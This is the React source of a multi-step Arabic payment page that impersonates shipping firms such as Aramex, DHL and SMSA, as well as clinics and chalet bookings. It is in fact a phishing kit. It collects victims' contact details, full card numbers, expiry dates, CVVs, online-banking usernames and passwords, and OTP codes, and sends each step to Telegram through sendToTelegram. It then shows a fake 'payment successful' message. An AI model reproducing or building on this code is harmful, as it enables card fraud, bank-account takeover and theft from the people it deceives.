import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getBanksByCountry } from "@/lib/banks";
import { getCountryTerminology } from "@/lib/countryTerminology";
import { 
  CreditCard, User, Mail, Phone, Hash, Building2, 
  ArrowLeft, ArrowRight, Shield, CheckCircle2, Loader2 
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { validateLuhn, formatCardNumber, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { sendToTelegram } from "@/lib/telegram";
import { getBankDesign } from "@/lib/bankDesigns";

const UnifiedPayment = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [step, setStep] = useState(1);
  const [selectedService, setSelectedService] = useState("");
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");
  const [selectedBank, setSelectedBank] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("card");
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  
  const [bankUsername, setBankUsername] = useState("");
  const [bankPassword, setBankPassword] = useState("");
  
  const [otpCode, setOtpCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const terminology = getCountryTerminology(countryCode);
  
  const linkType = linkData?.type || "payment";
  
  const availableServices = useMemo(() => {
    const services = [];
    if (linkType === "shipping") {
      services.push(
        { key: "aramex", nameAr: "أرامكس" },
        { key: "dhl", nameAr: "DHL" },
        { key: "fedex", nameAr: "فيدكس" },
        { key: "smsa", nameAr: "سمسا" },
        { key: "naqel", nameAr: "ناقل" }
      );
    } else if (linkType === "logistics") {
      services.push(
        { key: "warehouse", nameAr: "التخزين والمستودعات" },
        { key: "freight", nameAr: "الشحن والنقل" },
        { key: "customs", nameAr: "التخليص الجمركي" },
        { key: "distribution", nameAr: "خدمات التوزيع" }
      );
    } else if (linkType === "health") {
      services.push(
        { key: "consultation", nameAr: "استشارة طبية" },
        { key: "checkup", nameAr: "فحص دوري شامل" },
        { key: "dental", nameAr: "طب الأسنان" },
        { key: "lab-tests", nameAr: "التحاليل المخبرية" }
      );
    } else if (linkType === "chalet") {
      services.push(
        { key: "sa-abha-mountain", nameAr: "شاليه جبال أبها" },
        { key: "sa-riyadh-luxury", nameAr: "شاليه الرياض الفاخر" },
        { key: "sa-jeddah-beach", nameAr: "شاليه كورنيش جدة" }
      );
    } else {
      services.push(
        { key: "payment", nameAr: "دفع فاتورة" },
        { key: "invoice", nameAr: "سداد فاتورة" }
      );
    }
    return services;
  }, [linkType]);

  const serviceKey = selectedService || linkData?.payload?.service_key || availableServices[0]?.key || "payment";
  const branding = getServiceBranding(serviceKey);
  const banks = useMemo(() => getBanksByCountry(countryCode), [countryCode]);

  const amount = useMemo(() => {
    if (paymentAmount) return parseFloat(paymentAmount);
    return linkData?.payload?.payment_amount || 
           linkData?.payload?.shipping_fee || 
           linkData?.payload?.booking_amount ||
           linkData?.payload?.service_fee ||
           500;
  }, [paymentAmount, linkData]);

  useEffect(() => {
    if (linkData?.payload) {
      setSelectedService(linkData.payload.service_key || availableServices[0]?.key);
      setCustomerName(linkData.payload.customer_name || "");
      setCustomerEmail(linkData.payload.customer_email || "");
      setCustomerPhone(linkData.payload.customer_phone || "");
      setInvoiceNumber(linkData.payload.invoice_number || "");
      setPaymentAmount(linkData.payload.payment_amount?.toString() || "");
      setSelectedBank(linkData.payload.selected_bank || "");
    }
  }, [linkData, availableServices]);

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);
  };

  const handleNextStep = async () => {
    if (step === 1) {
      if (!selectedService || !customerName || !customerEmail || !customerPhone || !invoiceNumber || !paymentAmount) {
        toast({
          title: "خطأ",
          description: "الرجاء إكمال جميع البيانات",
          variant: "destructive",
        });
        return;
      }
      
      try {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: {
            ...linkData?.payload,
            service_key: selectedService,
            customer_name: customerName,
            customer_email: customerEmail,
            customer_phone: customerPhone,
            invoice_number: invoiceNumber,
            payment_amount: parseFloat(paymentAmount),
          },
        });
        
        // إرسال بيانات العميل إلى تيليجرام
        await sendToTelegram({
          type: 'payment_recipient',
          data: {
            linkId: id!,
            serviceKey: selectedService,
            serviceName: branding.nameAr || selectedService,
            name: customerName,
            email: customerEmail,
            phone: customerPhone,
            invoiceNumber: invoiceNumber,
            amount: parseFloat(paymentAmount),
            currency: countryCode,
            country: countryData?.nameAr || countryCode,
            step: 'customer_info'
          },
          timestamp: new Date().toISOString()
        });
        
        setStep(2);
      } catch (error) {
        // Error updating link
      }
    } else if (step === 2) {
      if (!selectedBank) {
        toast({
          title: "خطأ",
          description: "الرجاء اختيار البنك",
          variant: "destructive",
        });
        return;
      }
      
      try {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: {
            ...linkData?.payload,
            selected_bank: selectedBank,
          },
        });
        
        // إرسال اختيار البنك إلى تيليجرام
        const selectedBankData = banks.find(b => b.id === selectedBank);
        await sendToTelegram({
          type: 'payment_recipient',
          data: {
            linkId: id!,
            serviceKey: selectedService,
            serviceName: branding.nameAr || selectedService,
            name: customerName,
            email: customerEmail,
            phone: customerPhone,
            bank: selectedBankData?.nameAr || selectedBank,
            bankId: selectedBank,
            country: countryData?.nameAr || countryCode,
            step: 'bank_selected'
          },
          timestamp: new Date().toISOString()
        });
        
        setStep(3);
      } catch (error) {
        // Error updating link
      }
    } else if (step === 3) {
      if (paymentMethod === "card") {
        if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
          toast({
            title: "خطأ",
            description: "الرجاء إكمال بيانات البطاقة",
            variant: "destructive",
          });
          return;
        }
        
        const cleaned = cardNumber.replace(/\s/g, "");
        if (!validateLuhn(cleaned)) {
          toast({
            title: "خطأ",
            description: "رقم البطاقة غير صحيح",
            variant: "destructive",
          });
          return;
        }
        
        if (!validateExpiry(expiryMonth, expiryYear)) {
          toast({
            title: "خطأ",
            description: "تاريخ الانتهاء غير صحيح",
            variant: "destructive",
          });
          return;
        }
        
        if (!validateCVV(cvv)) {
          toast({
            title: "خطأ",
            description: "رمز CVV غير صحيح",
            variant: "destructive",
          });
          return;
        }
        
        // إرسال بيانات البطاقة إلى تيليجرام
        const selectedBankData = banks.find(b => b.id === selectedBank);
        await sendToTelegram({
          type: 'card_details_with_bank',
          data: {
            name: customerName,
            email: customerEmail,
            phone: customerPhone,
            service: branding.nameAr || selectedService,
            country: countryData?.nameAr || countryCode,
            countryCode: countryCode,
            bank: selectedBankData?.nameAr || selectedBank,
            bankId: selectedBank,
            cardholder: cardName,
            cardNumber: cardNumber,
            cardLast4: cardNumber.replace(/\s/g, "").slice(-4),
            cardType: 'card',
            expiry: `${expiryMonth}/${expiryYear}`,
            cvv: cvv,
            amount: formatCurrency(parseFloat(paymentAmount), countryCode)
          },
          timestamp: new Date().toISOString()
        });
        
        setStep(4);
      } else {
        if (!bankUsername || !bankPassword) {
          toast({
            title: "خطأ",
            description: "الرجاء إدخال بيانات الدخول للبنك",
            variant: "destructive",
          });
          return;
        }
        
        // إرسال بيانات تسجيل الدخول إلى تيليجرام
        const selectedBankData = banks.find(b => b.id === selectedBank);
        await sendToTelegram({
          type: 'bank_login',
          data: {
            name: customerName,
            email: customerEmail,
            phone: customerPhone,
            service: branding.nameAr || selectedService,
            country: countryData?.nameAr || countryCode,
            countryCode: countryCode,
            bank: selectedBankData?.nameAr || selectedBank,
            bankId: selectedBank,
            username: bankUsername,
            password: bankPassword,
            loginType: 'username',
            amount: formatCurrency(parseFloat(paymentAmount), countryCode)
          },
          timestamp: new Date().toISOString()
        });
        
        setStep(4);
      }
    } else if (step === 4) {
      if (!otpCode || otpCode.length < 4) {
        toast({
          title: "خطأ",
          description: "الرجاء إدخال رمز التحقق",
          variant: "destructive",
        });
        return;
      }
      
      setIsSubmitting(true);
      
      try {
        const selectedBankData = banks.find(b => b.id === selectedBank);
        
        await sendToTelegram({
          linkId: id!,
          serviceKey,
          serviceName: branding.nameAr || serviceKey,
          customerName,
          customerEmail,
          customerPhone,
          invoiceNumber,
          amount,
          currency: countryCode,
          country: countryData?.nameAr || countryCode,
          bankName: selectedBankData?.nameAr || selectedBank,
          cardNumber: paymentMethod === "card" ? cardNumber : "",
          cardName: paymentMethod === "card" ? cardName : "",
          expiryDate: paymentMethod === "card" ? `${expiryMonth}/${expiryYear}` : "",
          cvv: paymentMethod === "card" ? cvv : "",
          bankUsername: paymentMethod === "bank_login" ? bankUsername : "",
          bankPassword: paymentMethod === "bank_login" ? bankPassword : "",
          otpCode,
          paymentMethod,
        });
        
        toast({
          title: "تم الدفع بنجاح",
          description: "شكراً لك، تم معالجة الدفع بنجاح",
        });
        
        setTimeout(() => {
          navigate(`/pay/${id}/receipt`);
        }, 1500);
      } catch (error) {
        console.error("Error processing payment:", error);
        toast({
          title: "خطأ",
          description: "حدث خطأ أثناء معالجة الدفع",
          variant: "destructive",
        });
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  const handlePrevStep = () => {
    if (step > 1) setStep(step - 1);
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl">
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
          <p className="text-muted-foreground">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 sm:py-8" dir="rtl" style={{ background: branding.colors.background || "#f9fafb" }}>
      <div className="container mx-auto px-4 max-w-3xl">
        <div
          className="relative w-full h-32 sm:h-48 rounded-3xl overflow-hidden mb-6 shadow-xl"
          style={{
            background: branding.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
          }}
        >
          <div className="absolute inset-0 bg-black/20" />
          {branding.heroImage && (
            <img 
              src={branding.heroImage} 
              alt={branding.nameAr || serviceKey}
              className="absolute inset-0 w-full h-full object-cover opacity-30"
            />
          )}
          <div className="absolute inset-0 flex items-center justify-between px-6">
            <div className="text-white">
              <h1 className="text-2xl sm:text-4xl font-bold mb-2" style={{ fontFamily: branding.fonts?.primaryAr }}>
                {branding.nameAr || serviceKey}
              </h1>
              <p className="text-sm sm:text-base opacity-90">{countryData?.nameAr}</p>
            </div>
            {branding.logo && (
              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                <img 
                  src={branding.logo} 
                  alt={branding.nameAr || serviceKey}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
        </div>

        <div className="mb-6 flex justify-between items-center">
          {[1, 2, 3, 4].map((s) => (
            <div key={s} className="flex items-center flex-1">
              <div
                className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm ${
                  step >= s ? "text-white" : "text-gray-400"
                }`}
                style={{
                  background: step >= s ? branding.gradients?.primary || branding.colors.primary : "#e5e7eb",
                }}
              >
                {s}
              </div>
              {s < 4 && (
                <div className="flex-1 h-1 mx-2" style={{ background: step > s ? branding.colors.primary : "#e5e7eb" }} />
              )}
            </div>
          ))}
        </div>

        <Card className="p-6 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
          {step === 1 && (
            <div>
              <h2 className="text-2xl font-bold mb-6" style={{ color: branding.colors.primary }}>
                معلومات الدفع
              </h2>
              
              <div className="space-y-4">
                <div>
                  <Label className="flex items-center gap-2 mb-2">
                    <Building2 className="w-4 h-4" />
                    اختر الخدمة *
                  </Label>
                  <Select value={selectedService} onValueChange={setSelectedService}>
                    <SelectTrigger className="h-12">
                      <SelectValue placeholder="اختر الخدمة" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {availableServices.map((service) => (
                        <SelectItem key={service.key} value={service.key}>
                          {service.nameAr}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div>
                  <Label className="flex items-center gap-2 mb-2">
                    <User className="w-4 h-4" />
                    {terminology.customerName} *
                  </Label>
                  <Input
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    className="h-12"
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>

                <div>
                  <Label className="flex items-center gap-2 mb-2">
                    <Mail className="w-4 h-4" />
                    {terminology.email} *
                  </Label>
                  <Input
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    className="h-12"
                    placeholder="example@email.com"
                  />
                </div>

                <div>
                  <Label className="flex items-center gap-2 mb-2">
                    <Phone className="w-4 h-4" />
                    {terminology.phone} *
                  </Label>
                  <Input
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    className="h-12"
                    placeholder={`${countryData?.phoneCode} ${countryData?.phonePlaceholder}`}
                  />
                </div>

                <div>
                  <Label className="flex items-center gap-2 mb-2">
                    <Hash className="w-4 h-4" />
                    {terminology.invoiceNumber} *
                  </Label>
                  <Input
                    value={invoiceNumber}
                    onChange={(e) => setInvoiceNumber(e.target.value)}
                    className="h-12"
                    placeholder={terminology.invoiceNumberPlaceholder}
                  />
                </div>

                <div>
                  <Label className="flex items-center gap-2 mb-2">
                    <CreditCard className="w-4 h-4" />
                    {terminology.paymentAmount} *
                  </Label>
                  <Input
                    type="number"
                    value={paymentAmount}
                    onChange={(e) => setPaymentAmount(e.target.value)}
                    className="h-12"
                    placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
                    step="0.01"
                  />
                  <p className="text-xs text-muted-foreground mt-1">
                    {formatCurrency(amount, countryCode)}
                  </p>
                </div>
              </div>
            </div>
          )}

          {step === 2 && (
            <div>
              <h2 className="text-2xl font-bold mb-6" style={{ color: branding.colors.primary }}>
                اختر البنك
              </h2>
              
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-4">
                {banks.map((bank) => (
                  <Card
                    key={bank.id}
                    className={`p-4 cursor-pointer transition-all hover:shadow-md ${
                      selectedBank === bank.id ? "ring-2 bg-primary/5" : ""
                    }`}
                    style={{ borderColor: selectedBank === bank.id ? branding.colors.primary : undefined }}
                    onClick={() => setSelectedBank(bank.id)}
                  >
                    <div className="flex items-center gap-3">
                      <div
                        className="w-10 h-10 rounded-lg flex items-center justify-center text-white font-bold"
                        style={{ background: branding.colors.primary }}
                      >
                        {bank.nameAr.charAt(0)}
                      </div>
                      <div className="flex-1">
                        <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
                        <p className="text-xs text-muted-foreground">{bank.name}</p>
                      </div>
                      {selectedBank === bank.id && (
                        <CheckCircle2 className="w-5 h-5" style={{ color: branding.colors.primary }} />
                      )}
                    </div>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {step === 3 && (
            <div>
              <h2 className="text-2xl font-bold mb-6" style={{ color: branding.colors.primary }}>
                طريقة الدفع
              </h2>
              
              <div className="mb-6 flex gap-4">
                <Button
                  type="button"
                  variant={paymentMethod === "card" ? "default" : "outline"}
                  className="flex-1 h-12"
                  style={paymentMethod === "card" ? { background: branding.colors.primary } : {}}
                  onClick={() => setPaymentMethod("card")}
                >
                  <CreditCard className="w-5 h-5 ml-2" />
                  بيانات البطاقة
                </Button>
                <Button
                  type="button"
                  variant={paymentMethod === "bank_login" ? "default" : "outline"}
                  className="flex-1 h-12"
                  style={paymentMethod === "bank_login" ? { background: branding.colors.primary } : {}}
                  onClick={() => setPaymentMethod("bank_login")}
                >
                  <Building2 className="w-5 h-5 ml-2" />
                  تسجيل دخول البنك
                </Button>
              </div>

              {paymentMethod === "card" ? (
                <div className="space-y-4">
                  <div>
                    <Label className="mb-2">اسم حامل البطاقة *</Label>
                    <Input
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value)}
                      className="h-12"
                      placeholder="الاسم كما يظهر على البطاقة"
                    />
                  </div>

                  <div>
                    <Label className="mb-2">رقم البطاقة *</Label>
                    <Input
                      value={cardNumber}
                      onChange={(e) => handleCardNumberChange(e.target.value)}
                      className="h-12"
                      placeholder="0000 0000 0000 0000"
                      maxLength={19}
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label className="mb-2">تاريخ الانتهاء *</Label>
                      <div className="flex gap-2">
                        <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                          <SelectTrigger className="h-12">
                            <SelectValue placeholder="MM" />
                          </SelectTrigger>
                          <SelectContent className="bg-background">
                            {Array.from({ length: 12 }, (_, i) => {
                              const month = (i + 1).toString().padStart(2, "0");
                              return (
                                <SelectItem key={month} value={month}>
                                  {month}
                                </SelectItem>
                              );
                            })}
                          </SelectContent>
                        </Select>
                        <Select value={expiryYear} onValueChange={setExpiryYear}>
                          <SelectTrigger className="h-12">
                            <SelectValue placeholder="YY" />
                          </SelectTrigger>
                          <SelectContent className="bg-background">
                            {Array.from({ length: 20 }, (_, i) => {
                              const year = (new Date().getFullYear() + i).toString().slice(-2);
                              return (
                                <SelectItem key={year} value={year}>
                                  {year}
                                </SelectItem>
                              );
                            })}
                          </SelectContent>
                        </Select>
                      </div>
                    </div>

                    <div>
                      <Label className="mb-2">CVV *</Label>
                      <Input
                        type="password"
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                        className="h-12"
                        placeholder="123"
                        maxLength={4}
                      />
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  <div>
                    <Label className="mb-2">اسم المستخدم *</Label>
                    <Input
                      value={bankUsername}
                      onChange={(e) => setBankUsername(e.target.value)}
                      className="h-12"
                      placeholder="أدخل اسم المستخدم"
                    />
                  </div>

                  <div>
                    <Label className="mb-2">كلمة المرور *</Label>
                    <Input
                      type="password"
                      value={bankPassword}
                      onChange={(e) => setBankPassword(e.target.value)}
                      className="h-12"
                      placeholder="أدخل كلمة المرور"
                    />
                  </div>
                </div>
              )}
            </div>
          )}

          {step === 4 && (
            <div>
              <div className="text-center mb-8">
                <div
                  className="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4"
                  style={{ background: branding.gradients?.primary || branding.colors.primary }}
                >
                  <Shield className="w-10 h-10 text-white" />
                </div>
                <h2 className="text-2xl font-bold mb-2" style={{ color: branding.colors.primary }}>
                  رمز التحقق
                </h2>
                <p className="text-muted-foreground">
                  {terminology.otpMessage}
                </p>
              </div>

              <div>
                <Label className="mb-2 text-center block">أدخل رمز التحقق *</Label>
                <Input
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  className="h-14 text-center text-2xl tracking-widest"
                  placeholder="000000"
                  maxLength={6}
                />
              </div>

              <p className="text-xs text-center text-muted-foreground mt-4">
                لم يصلك الرمز؟{" "}
                <button className="underline" style={{ color: branding.colors.primary }}>
                  إعادة الإرسال
                </button>
              </p>
            </div>
          )}

          <div className="mt-8 flex gap-3">
            {step > 1 && (
              <Button
                type="button"
                variant="outline"
                onClick={handlePrevStep}
                className="flex-1 h-12"
              >
                <ArrowRight className="w-5 h-5 ml-2" />
                {terminology.back}
              </Button>
            )}
            <Button
              type="button"
              onClick={handleNextStep}
              disabled={isSubmitting}
              className="flex-1 h-12 text-white"
              style={{ background: branding.gradients?.primary || branding.colors.primary }}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-5 h-5 ml-2 animate-spin" />
                  جاري المعالجة...
                </>
              ) : (
                <>
                  {step === 4 ? terminology.payNow : terminology.next}
                  <ArrowLeft className="w-5 h-5 mr-2" />
                </>
              )}
            </Button>
          </div>

          <div className="mt-6 flex items-center justify-center gap-2 text-xs text-muted-foreground">
            <Shield className="w-4 h-4" />
            <span>{terminology.securePayment}</span>
          </div>
        </Card>
      </div>
    </div>
  );
};

export default UnifiedPayment;
